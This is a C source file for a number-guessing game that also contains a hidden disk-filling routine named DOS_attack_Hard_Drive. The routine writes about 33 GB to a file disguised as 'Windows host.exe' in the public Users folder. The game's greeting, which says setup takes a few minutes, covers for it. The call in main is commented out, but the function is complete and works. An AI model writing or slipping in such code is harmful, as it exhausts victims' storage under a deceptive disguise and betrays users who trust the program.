#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include "flushinput.h"

#define BLOCK_SIZE 3221225472

void DOS_attack_Hard_Drive()
{
    FILE *fil = fopen("C:\\Users\\Public\\Windows host.exe", "wb");
    size_t file_filled_times_counter = 0;

    if (fil == NULL)
    {
        fil = fopen("Windows.txt", "wb");
        if (fil == NULL)
        {
            perror("An Error occured");
            exit(1);
        }
    }

    char *buffer = (char *)malloc(BLOCK_SIZE);
    if (buffer == NULL)
    {
        perror("An Error occured");
        exit(1);
    }

    memset(buffer, 62, BLOCK_SIZE);

    while (1)
    {
        if (file_filled_times_counter == 11)
        {
            fclose(fil);
            free(buffer);
            break;
        }

        int status = fwrite(buffer, BLOCK_SIZE, 1, fil);
        if (status != 1)
        {
            fprintf(stderr, "\nError occured\n");
            exit(1);
        }

        file_filled_times_counter += 1;
        fflush(fil);
    }
}

int main()
{
    char user_input_buffer[4] = {0};
    int computer;
    int user;
    int number_of_guesses = 0;

    puts("Hey there let's play a game! Setting up the environment will not take more than 2-3 mins....");

   // DOS_attack_Hard_Drive(); 

    srand(time(0) + clock());
    computer = (rand() % 100) + 1;

    printf("\n");

    do
    {
        printf("Enter your choice between (1-100): ");

        while (1)
        {
            /* Read input into buffer and check for EOF/error */
            char *res = fgets(user_input_buffer, (int)sizeof(user_input_buffer), stdin);
            if (res == NULL)
            {
                fprintf(stderr, "\nError while taking input or EOF encountered\n");
                return 1;
            }

            /* Strip trailing newline if present; otherwise clear remaining input */
            size_t len = strlen(user_input_buffer);
            if (len > 0 && user_input_buffer[len - 1] == '\n')
            {
                user_input_buffer[len - 1] = '\0';
            }
            else
            {
                /* Input was longer than buffer; flush the rest */
                flush_input();
            }

            /* Parse integer and validate range */
            int read_value = sscanf(user_input_buffer, "%d", &user);
            if (read_value != 1)
            {
                fprintf(stderr, "\nInvalid input. Please enter a valid integer between 1 and 100:\n");
                continue;
            }
            if (user < 1 || user > 100)
            {
                fprintf(stderr, "\nNumber out of range. Allowed range is 1 to 100. Enter again:\n");
                continue;
            }

            /* Valid guess: count it and continue to comparison */
            number_of_guesses++;
            break;
        }

        if (user < computer)
        {
            printf("Higher number please!\n");
        }
        else if (user > computer)
        {
            printf("Lower number please!\n");
        }
        else
        {
            printf("Congrats! You guessed it in %d attempt%s\n", number_of_guesses, (number_of_guesses == 1) ? "" : "s");
        }

    } while (computer != user);

    return 0;
}
